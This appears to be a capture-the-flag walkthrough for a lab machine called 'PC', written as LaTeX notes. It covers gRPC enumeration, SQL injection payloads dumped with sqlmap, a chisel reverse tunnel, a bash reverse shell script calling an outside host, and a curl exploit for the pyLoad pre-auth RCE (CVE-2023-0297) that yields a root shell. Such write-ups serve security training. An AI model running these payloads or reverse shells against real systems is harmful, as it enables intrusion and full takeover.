\chapter{PC}
\begin{itemize}
    \item {\bf technics}: grpc, pyload
    \item {\bf Components}: 
    \item {\bf tools}: grpcurl, grpcui
\end{itemize}


\section{nmap}
\begin{verbatim}
$ nmapz 10.10.11.214
TCP ports found: 22,50051
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-11 04:35 CEST
Nmap scan report for 10.10.11.214
Host is up (0.033s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)
|   256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA)
|_  256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.94%I=7%D=6/11%Time=64853315%P=x86_64-pc-linux-gnu%r(N
SF:ULL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x0
SF:6\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(Generic
SF:Lines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GetRe
SF:quest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(HTTPO
SF:ptions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0
SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RTSP
SF:Request,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\
SF:0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RPC
SF:Check,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(DNSVe
SF:rsionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\
SF:xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0
SF:")%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0
SF:\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\
SF:0\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0
SF:\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\
SF:0\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x0
SF:5\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0
SF:\?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?
SF:\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x0
SF:8\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
SF:0\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
SF:0\0\0\0\0\0\?\0\0")%r(X11Probe,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff
SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\
SF:0\0\0\0\0\?\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\end{verbatim}

\section{gRPC}

\begin{itemize}
    \item \url{https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9}
\end{itemize}


\begin{verbatim}
$ ./grpcurl -plaintext 10.10.11.214:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection

$ ./grpcurl -plaintext 10.10.11.214:50051 list SimpleApp
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo

$ ./grpcurl -plaintext 10.10.11.214:50051  SimpleApp.LoginUser
{
  "message": "Login unsuccessful"
}
$ ./grpcurl -plaintext 10.10.11.214:50051  describe SimpleApp
SimpleApp is a service:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}

$ ./grpcurl -plaintext -d '{"username": "toto", "password": "toto"}' 10.10.11.214:50051  SimpleApp.RegisterUser
{
  "message": "Account created for user toto!"
}

$ ./grpcurl -plaintext -d '{"username": "toto", "password": "toto"}' 10.10.11.214:50051  SimpleApp.LoginUser
{
  "message": "Your id is 242."
}

$ ./grpcurl -plaintext -d '{"username": "toto", "password": "toto"}' -v 10.10.11.214:50051  SimpleApp.LoginUser

Resolved method descriptor:
rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Response contents:
{
  "message": "Your id is 345."
}

Response trailers received:
token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidG90byIsImV4cCI6MTY4NjU0NTExM30.rjeHMKy4l5dcevrXaXyshk6sz1c09G89DqGUuqCauKM'
Sent 1 request and received 1 response

$ jwt-tool 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidG90byIsImV4cCI6MTY4NjU0NTExM30.rjeHMKy4l5dcevrXaXyshk6sz1c09G89DqGUuqCauKM'

=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = "JWT"
[+] alg = "HS256"

Token payload values:
[+] user_id = "toto"
[+] exp = 1686545113    ==> TIMESTAMP = 2023-06-12 06:45:13 (UTC)

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------



\end{verbatim}

grpcui donne les params associés aux endpoints
\begin{verbatim}
$ ~/go/bin/grpcui -plaintext 10.10.11.214:50051
gRPC Web UI available at http://127.0.0.1:36327/

POST /invoke/SimpleApp.getInfo HTTP/1.1
Host: 127.0.0.1:36327
Content-Length: 192
sec-ch-ua:
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
Content-Type: application/json
Accept: */*
X-Requested-With: XMLHttpRequest
x-grpcui-csrf-token: xbvVmy1TiWZXNoM8AtJvJKlAOveAbto4kRizt7WZkLs
sec-ch-ua-platform: ""
Origin: http://127.0.0.1:36327
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:36327/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _grpcui_csrf_token=xbvVmy1TiWZXNoM8AtJvJKlAOveAbto4kRizt7WZkLs
Connection: close

{"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidG90byIsImV4cCI6MTY4NjU0NzUxMn0.lCSiyPgY6wMwcP1xS07aajSxVDKTrQl58k7T-cSdLmQ"}],"data":[{"id":"611"}]}


$ sqlmap -r /tmp/get.req -p id --level=5 --risk=3 --dump

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 04:48:59 /2023-06-12/

[04:48:59] [INFO] parsing HTTP request from '/tmp/get.req'
JSON data found in POST body. Do you want to process it? [Y/n/q]
[04:49:02] [INFO] resuming back-end DBMS 'sqlite'
[04:49:02] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidG90byIsImV4cCI6MTY4NjU0NzUxMn0.lCSiyPgY6wMwcP1xS07aajSxVDKTrQl58k7T-cSdLmQ"}],"data":[{"id":"-1587 OR 9288=9288"}]}

    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidG90byIsImV4cCI6MTY4NjU0NzUxMn0.lCSiyPgY6wMwcP1xS07aajSxVDKTrQl58k7T-cSdLmQ"}],"data":[{"id":"611 OR 9316=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))"}]}

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidG90byIsImV4cCI6MTY4NjU0NzUxMn0.lCSiyPgY6wMwcP1xS07aajSxVDKTrQl58k7T-cSdLmQ"}],"data":[{"id":"611 UNION ALL SELECT CHAR(113,98,122,107,113)||CHAR(83,86,73,71,118,121,109,119,86,103,107,121,89,90,107,83,100,85,103,108,118,119,108,104,106,70,78,82,89,98,69,100,86,86,72,113,116,116,106,85)||CHAR(113,112,122,106,113)-- SGFL"}]}
---


\end{verbatim}

\section{sau}


\begin{verbatim}
$ ssh sau@10.10.11.214
The authenticity of host '10.10.11.214 (10.10.11.214)' can't be established.
ED25519 key fingerprint is SHA256:63yHg6metJY5dfzHxDVLi4Zpucku6SuRziVLenmSmZg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.214' (ED25519) to the list of known hosts.
sau@10.10.11.214's password:
Last login: Mon May 15 09:00:44 2023 from 10.10.14.19



╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::50051                :::*                    LISTEN      -

sau@pc:~$ ./chisel client 10.10.16.2:4444 R:4445:127.0.0.1:8000

$ chisel server -p 4444 --reverse
2023/06/12 05:02:16 server: Reverse tunnelling enabled
2023/06/12 05:02:16 server: Fingerprint gZzOD0ubgif/wYOKfSvbpBfWezBwzpiKJukLeTN5WWw=
2023/06/12 05:02:16 server: Listening on http://0.0.0.0:4444
2023/06/12 05:04:04 server: session#1: Client version (1.8.1) differs from server version (v1.8.1)
2023/06/12 05:04:04 server: session#1: tun: proxy#R:4445=>8000: Listening

\end{verbatim}



\href{https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad}{CVE-2023-0297: Pre-auth RCE in pyLoad}

\begin{verbatim}
sau@pc:~$ cat /tmp/test.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.2/4446 0>&1

$ curl -i -s -k -X $'POST'\
    --data-binary $'jk=pyimport%20os;os.system(\"bash%20/tmp/test.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'_
    $'http://127.0.0.1:4445/flash/addcrypted2'

$ nc -lnvp 4446
Connection from 10.10.11.214:37110
bash: cannot set terminal process group (1064): Inappropriate ioctl for device
bash: no job control in this shell
root@pc:~/.pyload/data# id
id
uid=0(root) gid=0(root) groups=0(root)

\end{verbatim}


